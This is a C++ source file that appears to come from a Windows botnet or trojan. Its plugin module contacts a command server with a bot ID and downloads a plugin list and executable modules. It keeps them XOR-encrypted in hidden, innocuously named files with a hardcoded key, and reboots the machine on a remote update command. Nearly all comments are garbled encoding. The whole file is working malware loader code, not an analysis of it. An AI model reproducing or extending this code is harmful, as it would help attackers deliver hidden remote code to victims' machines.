//---------------------------------------------------------------------------

#include <shlobj.h>

#include "BotCore.h"
#include "BotHTTP.h"
#include "Plugins.h"
#include "HTTPConsts.h"
#include "Task.h"
#include "md5.h"

//---------------------------------------------------------------------------


// ������ �������� ��� ������ ���������� �����������

#include "BotDebug.h"

namespace PLGDEBUGTEMPLATES
{
    #include "DbgTemplates.h"
}
#define PDBG  PLGDEBUGTEMPLATES::DBGOutMessage<>


//---------------------------------------------------------------------------

// ������ ��� �������� � �������� ���� ��������
namespace PLGLoader
{

	// ������ ���������� �����. ���������� ������������ ���������� �
	// ���������� ���� ������ ���������� ����� �� �������� ���������
    const static char PluginListPassword[] = {'G', 'D', 'l', 'e', 't', '6', '4', 'E',  0};

    // ��������� ����� ������
	#define PLUGINS_LIST_FILE_SIGNATURE 0xF3C5A945

	// ������ ����� ������ ��������
	#define PLUGINS_LIST_FILE_VERSION 1

	//-------------------------------------------------------------------------

	// ��������� ����� ��������
	#pragma pack(push, 1)
	typedef struct TFileHeader
	{
		DWORD Signature;   // ��������� �����
		DWORD Version;     // ������ �����
		DWORD UpdateTime;  // ����� ���������� ���������� (� �����)
        DWORD HostHash;    // ��� ����� ��� �������� ��������� ������
        DWORD DataSize;    // ������ ������
	} *PFileHeader;
	#pragma pack(pop)

	//-------------------------------------------------------------------------

	PCHAR GetFileName()
	{
		// ������� ���������� ��� ����� ������ ��������
		const static char PluginsListFileName[] = {'w', 'n', 'd', 's', 'k', 's', 'i', '.', 'i', 'n', 'f',  0};

		return BOT::GetWorkPathInSysDrive(NULL, (PCHAR)PluginsListFileName);
	}

	//-------------------------------------------------------------------------
	bool NeedUpdateFile(PCHAR FileName, PCHAR Host)
	{
		// ������� ����� ������ ���� ���������� �����������
		// ������ ��������

		// ��������� ���� ��� ������
		HANDLE File = pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

		if (File == INVALID_HANDLE_VALUE)
		{
			//  ���������� ������ ���� ���� �� ������
			return (DWORD)pGetLastError() == ERROR_FILE_NOT_FOUND;
		}

		// ������ ��������� �����
		TFileHeader H;
		ClearStruct(H);

		DWORD Readed;
		pReadFile(File, &H, sizeof(H), &Readed, NULL);
		if (Readed != sizeof(H))
		{
			// ��������� ����
			pCloseHandle(File);
            return true;
		}


		// ��������� � �����-�� ����� ���� ���������� ��������
		bool Result = H.HostHash != CalcHash(Host);

		pCloseHandle(File);
		return Result;

    }
	//-------------------------------------------------------------------------

	void DoWriteBufferToFile(HANDLE File, PCHAR Buf, PCHAR Host)
	{
		// ������� ���������� ����������� ����� � ����

		DWORD Writed;

		// ���������� ��������� �����

		TFileHeader H;

		H.Signature  = PLUGINS_LIST_FILE_SIGNATURE;
		H.Version    = PLUGINS_LIST_FILE_VERSION;
		H.UpdateTime = (DWORD)pGetTickCount();
		H.HostHash   = CalcHash(Host);
		H.DataSize   = STR::Length(Buf);

		pWriteFile(File, &H, sizeof(H), &Writed, NULL);

		if (H.DataSize == 0)
			return;

		// ������� �����
        XORCrypt::Crypt((PCHAR)PluginListPassword, (LPBYTE)Buf, H.DataSize);

        // ���������� � ����
		pWriteFile(File, Buf, H.DataSize, &Writed, NULL);
	}
    //-------------------------------------------------------------------------

	bool DownloadListInFile(PCHAR FileName, PCHAR URL, PCHAR Host)
	{
		// ������� ��������� ������ �������� � ����
		// �� ����� �������� ���� �����������

		// ������ ���� ��� ������
		HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,  FILE_ATTRIBUTE_HIDDEN, NULL);

		if (File == INVALID_HANDLE_VALUE)
		{
			// � ������ ������ �������� ����� ��� ������ ������ ����������
			// ������� ������ � ������ ������ ������ �������, ��� ��������
			// ��������� ����� ������ ���������/������� ��� �������� ������
			return pGetLastError() == ERROR_SHARING_VIOLATION;
		}


		// ��������� ��� �������� ������ ��������
        PDBG("Plugins", "��������� ������ ��������");
		PCHAR Buf = NULL;
		do
		{
			PDBG("Plugins", "try to DownloadPluginList('%s')", URL);
			Buf = Plugin::DownloadPluginList(URL);
			if (Buf != NULL)
			{
				// ���������� ������ � ����
				PDBG("Plugins", "������ �������� ��������");
                DoWriteBufferToFile(File, Buf, Host);
			}
			else
			{
				PDBG("Plugins", "DownloadPluginList failed. Sleeping 30 sec...");
				pSleep(30 * 1000);
			}
		}
		while (Buf == NULL);
				
		// ��������� ����
		pCloseHandle(File);

		return true;
	}
    //-------------------------------------------------------------------------

	PCHAR ReadListFromFile(PCHAR FileName)
	{
		// ������� ��������� ������ �������� �� �����

		DWORD Size = 0;
		LPBYTE Buf = File::ReadToBufferA(FileName, Size);
		if (Buf == NULL)
			return NULL;
		if (Size < sizeof(TFileHeader))
		{
			MemFree(Buf);
			return NULL;
        }

		// �������� ���������
		PFileHeader H = (PFileHeader)Buf;

		if (H->DataSize > (Size - sizeof(TFileHeader)))
		{
			// ���� ���� �����, ���� �� ���
			MemFree(Buf);
            pDeleteFileA(FileName);
			return NULL;
        }

		// ������� �����
		LPBYTE Temp = Buf + sizeof(TFileHeader);
        XORCrypt::Crypt((PCHAR)PluginListPassword, Temp, H->DataSize);

		PCHAR Str = STR::New((PCHAR)Temp, H->DataSize);
		MemFree(Buf);

		return Str;

	}
	//------------------------------------------------------------------------

	PCHAR ExtractPluginURL(PCHAR PluginName, PCHAR Buf)
	{
		// ������� ��������� ����� ������� �� �������
		if (Buf == NULL)
			return NULL;

		// ���������� ������� ����� � ������
		int Pos = STR::Pos(Buf, PluginName, 0);
		if (Pos < 0)
			return NULL; // � ������ ��� ������� �������

		// ���������� ����������� |
		PCHAR Start = Buf + Pos;
		PCHAR End = Start;
		while (*End != '|') End++;
		End++;

        Start = End;

		// ���������� ����� ������
		while (*End != 0 && *End != 10 && *End != 13) End++;

		// ���������� �����
		return STR::New(Start, End - Start);

	}
}


//****************************************************************************
//	������ ��� ����� � ����� ��������
//****************************************************************************
namespace PLGCACHE
{

	char CacheFolder[] = {'p', 'g', 'c', 'h', 'e', '\\', 0};

	//=========================================================================

	PCHAR inline GetCachePath()
	{
		// ������� ���������� ���� � ��������� ����
		return BOT::GetWorkPathInSysDrive(CacheFolder, NULL);
	}
	//-------------------------------------------------------------------------

	PCHAR GetPluginCacheFileName(PCHAR Path, PCHAR PluginName)
	{
		// ������� ���������� ��� ����� �������
		if (STR::IsEmpty(PluginName))
        	return NULL;


		// �������� ���� � ���������
		bool FreePath = STR::IsEmpty(Path);
		if (FreePath)
			Path = GetCachePath();
		if (Path == NULL)
			return NULL;


		// �������� ������ ��� �����
		PCHAR FN = STR::New(2, Path, PluginName);


        // ����������� �����
		if (FreePath)
            STR::Free(Path);

		return FN;
	}
	//-------------------------------------------------------------------------

}

//****************************************************************************
//  ������ ������ � ���������
//****************************************************************************

PCHAR Plugin::GetURL(PCHAR Name, PCHAR PluginsListURL, bool UpdateList)
{
	// ������� ���������� ����� �� �������� ����� ��������� ������
	if (STR::IsEmpty(Name))
		return NULL;

	PDBG("Plugins", "�������� ����� ������� [%s]", Name);

	// �������� ����� ��������
	bool FreeURL = false;
	if (STR::IsEmpty(PluginsListURL))
	{
		FreeURL = true;
		PluginsListURL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
	}
	if (PluginsListURL != NULL)
	{
    	PDBG("Plugins", "����� ������ ��������: \r\n   [%s]", PluginsListURL);
	}
	else
	{
		PDBG("Plugins", "�� ������� �������� ����� ������ ��������!");
		return NULL;
    }

	// ������������ ����� ������ �������� ��� ��������� �����
	TURLREC URLRec;
	ClearStruct(URLRec);

	ParseURL(PluginsListURL, &URLRec);

	// �������� ��� ����� � ������� �������� ������ ��������
    PCHAR FileName = PLGLoader::GetFileName();
	PDBG("Plugins", "��� ����� �� ������� �������� [%s]", FileName);

	// ���� ������. ��������� ������ ��������
	// ��������� � ������ ���� UpdateList == true ���� ��������� ����
	// ����������� �� �����
	// �� ������ ������ �������� ������� ����������� ��������
	if (UpdateList || PLGLoader::NeedUpdateFile(FileName, URLRec.Host))
	{
		bool Completed = false;
		do
		{
			PDBG("Plugins", "���������� ������� ������ �� ����. ������� �������");
			if (PluginsListURL != NULL)
				Completed = PLGLoader::DownloadListInFile(FileName, PluginsListURL, URLRec.Host);

			if (!Completed)
			{
				pSleep(3000);
				if (FreeURL)
				{
					ClearURL(&URLRec);
					STR::Free(PluginsListURL);
					PluginsListURL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
                    ParseURL(PluginsListURL, &URLRec);
                }
			}

		}
		while (!Completed);
	}
	else 
	{
		PDBG("Plugins", "������� �� ���� �� ����. ��������� �� ����� ����.");
	}

	// ���� ������: �������� ��������� ����
	// ������ �� ����� ���-�� �����������. ������ �� ������� ����, ���
	// � ������ ������ ����� ���� �������� ������ � ������� ����� NULL
	PCHAR Buf = NULL;
	do
	{
		Buf = PLGLoader::ReadListFromFile(FileName);
		if (Buf == NULL)
			pSleep(60000);
	}
	while (Buf == NULL);

	//���� ������: �������� ������
	PCHAR FullURL = NULL;
	//File::WriteBufferA( "c:\\plg.txt", Buf, STR::Length(Buf) );
	PCHAR URLFileName = PLGLoader::ExtractPluginURL(Name, Buf);
	if (URLFileName != NULL)
	{
		PDBG("Plugins", "���� � �������: [%s]", URLFileName);
		FullURL = STR::New(5, ProtocolHTTP, HTTPProtocolDelimeter, URLRec.Host, "/", URLFileName );
		STR::Free(URLFileName);
	}

	STR::Free(FileName);
	STR::Free(Buf);
	if (FreeURL) STR::Free(PluginsListURL);
	ClearURL(&URLRec);

	
	PDBG("Plugins", "����� �������: [0x%X : '%s']", FullURL, 
		((FullURL == NULL) ? "(null)":FullURL));

	return FullURL;
}
//---------------------------------------------------------------------------


PCHAR Plugin::DownloadPluginList(PCHAR URL)
{
	// ��������� ������ �������� ��������� �� ������� �������

	bool FreeURL = false;
	if (URL == NULL)
	{
		FreeURL = true;
		URL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
	}
	if (URL == NULL) return NULL;

    // ���������� ���� ������
	PCHAR Result = NULL;
	PCHAR BotID = GenerateBotID();

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "botuid", BotID);

	THTTPResponse Response;
    ClearStruct(Response);

	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();
		CryptHTTP::Post(URL, Password, Fields, &Result, &Response);
		STR::Free(Password);
	#else
		HTTP::Post(URL, Fields, &Result, NULL);
	#endif

    // ���������� ��������� ������ �������
	if (FreeURL) STR::Free(URL);
	STR::Free(BotID);
	Strings::Free(Fields);

	if (Response.Code != 200)
		STR::Free2(Result);

    HTTPResponse::Clear(&Response);


    PDBG("Plugins", "���������� ������������ ������ ��������: \r\n: [%s]", Result);

	return Result;
}
//---------------------------------------------------------------------------

LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileSize)
{

	//  ������� ��������� ���� ������� � �������. ���� �������
	//	� ���������� ���������, �.�. �� ����������������.

	if (FileSize != NULL)
		*FileSize = 0;
	PDBG("Plugins", "��������� ���� ������� [%s]", PluginName);

	// ��������� ���� �������� �������
	bool UpdateList = false;
	DWORD UpdateCount = 0; // ������� ���������� ������

    LPBYTE Module = NULL;
	do
	{
		// �������� ������ ����� �������

		PCHAR URL = GetURL(PluginName, PluginsListURL, UpdateList);

		if (URL == NULL)
		{
			// �� ������� ����������� ������������� ������
			PDBG("Plugins", "GetURL('%s', '%s', %d) ������ NULL. ���� 30 ��� � ������� ���.", 
				PluginName, PluginsListURL, UpdateList);
			pSleep(30 * 1000);
			UpdateList = true;
			continue;
		}

		// � ������ �� ������� ���������� ������, ����� ��������� ��������
		// ������� ����, ���������������� �����
		if (UpdateList && UpdateCount > 1)
		{
			DWORD Interval = 60000;

			if (UpdateCount > 10)
			{
				if (UpdateCount <= 20)
					Interval = Interval * 2;
				else
				if (UpdateCount <= 100)
					Interval = Interval * 3;
				else
					Interval = Interval * 5;
			}

			pSleep(Interval);
		}

		// ��������� ��������

		THTTPResponse Response;
		ClearStruct(Response);

		PCHAR Document = NULL;
		#ifdef CryptHTTPH
			PCHAR Pass = GetMainPassword();

			bool Loaded = CryptHTTP::Get(URL, Pass, &Document, &Response);
			STR::Free(Pass);
		#else
			bool Loaded = HTTP::Get(URL, &Document, &Response);
		#endif

		STR::Free(URL);

		// ������������ ��������� ��������
		UpdateList = false;

		if (Loaded)
		{
			if (Response.Code == HTTP_CODE_OK)
			{
				PDBG("Plugins", "������ [%s] ������� ��������", PluginName);
				// �������� ����
				DWORD Size = STR::Length(Document);
				Module = (LPBYTE)MemAlloc(Size);
				if (Module == NULL) break;

				// �������� ��������
                m_memcpy(Module, Document, Size);
				if (FileSize != NULL)
					*FileSize = Size;
			}
			else
			{
				UpdateList = true;
				UpdateCount++;
			}
		}
		else
		{
			// � ������ ���������� ��������� �������� �� ��������� �����
			pSleep(60000);
        }

		HTTPResponse::Clear(&Response);
	}
	while (Module == NULL);

    return Module;
}
//---------------------------------------------------------------------------

LPBYTE Plugin::Decode(LPBYTE Buffer, DWORD BufferSize, bool IsExecutable, DWORD *NewBufferSize)
{
	// ������� ���������� ������.
	if (NewBufferSize != NULL)
		*NewBufferSize = 0;

	if (Buffer == NULL || BufferSize == 0)
		return NULL;

	// �������������� XOR ����������
	const static char Signature[] = {'B', 'J', 'B', 0};
	DWORD Size = BufferSize;
	LPBYTE Body = XORCrypt::DecodeBuffer((PCHAR)Signature, Buffer, Size);

	if (Body == NULL)
	{
		// ������� ��������� ��������, ��� ������ �� ��� ����������
		// XOR ������������
		Body = Buffer;
		Size = BufferSize;
	}

	// ������ ������ ������
	LPBYTE Module = NULL;
	if (Body != NULL && Size > 0 && (!IsExecutable || IsExecutableFile(Body)))
	{
		Module = (LPBYTE)MemAlloc(Size);
 		if (Module != NULL)
		{
			m_memcpy(Module, Body, Size);
			if (NewBufferSize != NULL)
				*NewBufferSize = Size;
		}
	}

	return Module;
}

//---------------------------------------------------------------------------

LPBYTE Plugin::Download(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size, bool IsExecutable)
{
	// ������� ��������� � ����������� ������
	return DownloadEx(PluginName, PluginListURL, Size, IsExecutable, false, NULL);
}
//---------------------------------------------------------------------------

LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
				  bool IsExecutable, bool UseCache, PCHAR CachePath)
{
	// ������� ��������� � ���������� ������ ���������
	// �������������� ���������
	if (Size != NULL)
		*Size = 0;

    // �������� ��� ����� ����
	PCHAR CacheFileName = NULL;
	if (UseCache)
		CacheFileName = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);

	PDBG("Plugins", "DownloadEx: GetPluginCacheFileName() CacheFileName='%s'", CacheFileName);

	DWORD BufSize = 0;
	LPBYTE Buffer = NULL;

	// ��������� ������� ����� � ���� � ���� ������������� ����
	if (CacheFileName != NULL)
	{
		PDBG("Plugins", "DownloadEx: try ReadToBuffer() CacheFileName='%s'", CacheFileName);
		
		Buffer = (LPBYTE)CryptFile::ReadToBuffer(CacheFileName, &BufSize, NULL);
		
		PDBG("Plugins", "DownloadEx: ReadToBuffer() Buffer=0x%X", Buffer);
	}

	// ��������� ���� ������� �� ����, ����:
	// 1) ��������� ���� ������������� ���� � �� ������� ��������� ����
	// 2) �� ��������� ���� ������������� ����
	bool Downloaded = false;
	if (Buffer == NULL)
	{
		PDBG("Plugins", "DownloadEx: try DownloadFile() CacheFileName='%s'", CacheFileName);

		Buffer = DownloadFile(PluginName, PluginListURL, &BufSize);
		Downloaded = true;
	
		PDBG("Plugins", "DownloadEx: DownloadFile() result 0x%X", Buffer);
    }

	if (Buffer == NULL)
		return NULL;


	// 2. �������������� ������
	// ������ ������: ���� �� ����� �������������� ������ � ������, ���� 
	// ��������� ���� "IsExecutable" � ���������� ���� ������������� ����� PE 
	// ���������

	LPBYTE Module = NULL;

	if (!IsExecutable || !IsExecutableFile(Buffer))
	{
		Module = Decode(Buffer, BufSize, IsExecutable, &BufSize);
		PDBG("Plugins", "DownloadEx: loaded buffer decoded.");
	}
	else
	{
		PDBG("Plugins", "DownloadEx: loaded buffer NOT decoding.");
		Module = Buffer;
	}

	// ��� ������������� �������� ����:
	// ����� ��������� ���� ������������� ���� � ���� ��� ������ �� ����
	if (CacheFileName != NULL && Downloaded && Module != NULL)
	{
		PDBG("Plugins", "DownloadEx: writing file to CacheFileName='%s'", CacheFileName);
		CryptFile::WriteFromBuffer(CacheFileName, Module, BufSize, NULL);
	}

	// ����������� ������
	if (Module != Buffer) MemFree(Buffer);
	STR::Free(CacheFileName);


    // ���������� ���������
	if (Size != NULL)
		*Size = BufSize;
	return Module;
}
//---------------------------------------------------------------------------

bool Plugin::DownloadInCache(PCHAR PluginName, bool IsExecutable, bool IgnoreIfExists, PCHAR CachePath)
{
	//  ������� ��������� ������ � ���

	// ��������� ���������� �� ���� �� �����
	if (IgnoreIfExists)
	{
		PCHAR FN = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);
		bool Exists = FileExistsA(FN);
		STR::Free(FN);

		if (Exists)
        	return true;
    }

    // ��������� ����
	LPBYTE Buf = DownloadEx(PluginName, NULL, NULL, IsExecutable, true, CachePath);

	bool Result = Buf != NULL;

	MemFree(Buf);

	return Result;
}
//---------------------------------------------------------------------------


LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR CachePath, DWORD *PluginSize)
{
	// ������� ��������� ������ �� ����
	if (PluginSize != NULL)
        *PluginSize = 0;

	PCHAR FN = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);

	if (FN == NULL)
		return NULL;

	DWORD Size = 0;
	LPBYTE Buf = (LPBYTE)CryptFile::ReadToBuffer(FN, &Size, NULL);


	if (Buf != NULL && IsExecutable  && !IsExecutableFile(Buf))
	{
		MemFree(Buf);
		Buf = NULL;
		Size = 0;
    }

	STR::Free(FN);

	if (PluginSize != NULL)
		*PluginSize = Size;
    return Buf;
}
//---------------------------------------------------------------------------
const char* Plugin::CommandUpdatePlug = "updateplug";

void CalcMd5SummForBuffer(const void* data, DWORD size, BYTE summ[16])
{
	MD5_CTX ctx;	

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)data, size );

	MD5Final(summ, &ctx);
}

bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	PDBG("Plugins", "ExecuteUpdatePlug: '%s'", Args);
	
	PCHAR  PlugName = Args;

	DWORD  CachedFileSize = 0;
	LPBYTE CachedFile = DownloadFromCache(PlugName, true, NULL, &CachedFileSize);
	PDBG("Plugins", "ExecuteUpdatePlug: DownloadFromCache() return body=0x%X size=%d", CachedFile, 
		CachedFileSize);

	DWORD  NetworkFileSize = 0;
	LPBYTE NetworkFile = DownloadEx(PlugName, NULL, &NetworkFileSize, true, false, NULL);
	PDBG("Plugins", "ExecuteUpdatePlug: Download() return body=0x%X size=%d", NetworkFile, 
		NetworkFileSize);

	PCHAR CacheFileName = PLGCACHE::GetPluginCacheFileName(NULL, PlugName);

	do
	{
		PDBG("Plugins", "ExecuteUpdatePlug: check is file loaded from network");
		// ��������� ���������� �� ����
		if (NetworkFile == NULL) break;

		// ��������� ������ (PE)
		PDBG("Plugins", "ExecuteUpdatePlug: check file from network for PE");
		if (!IsExecutableFile(NetworkFile)) break;

		// ������� md5 �����
		PDBG("Plugins", "ExecuteUpdatePlug: compare md5 summs");
		if (CachedFile != NULL)
		{
			BYTE sumCached[16];
			BYTE sumNetwork[16];

			m_memset(sumCached, 0, 16);
			m_memset(sumNetwork, 0, 16);

			CalcMd5SummForBuffer(CachedFile, CachedFileSize, sumCached);
			CalcMd5SummForBuffer(NetworkFile, NetworkFileSize, sumNetwork);

			int sumCompareResult = m_memcmp(sumCached, sumNetwork, 16);
			PDBG("Plugins", "ExecuteUpdatePlug: sumCompareResult=%d", sumCompareResult);

			// ���� ����� ��������� - ������ �� ������.
			if (sumCompareResult == 0) break;
		}
		
		// ��������� ���������� �� �������� ����� ��� ����.
		if (CacheFileName == NULL) break;
		
		DWORD written = CryptFile::WriteFromBuffer(CacheFileName, NetworkFile, NetworkFileSize, NULL);
		PDBG("Plugins", "ExecuteUpdatePlug: CryptFile::WriteFromBuffer() return %d", written);

		// �� ���������� ��������.
		if (written == 0) break;

		PDBG("Plugins", "ExecuteUpdatePlug: start machine reboot.");
		Reboot();

		return true;
	}
	while (0);


	if (CachedFile) MemFree(CachedFile);
	if (NetworkFile) MemFree(NetworkFile);
	if (CacheFileName) STR::Free(CacheFileName);

	return false;
}
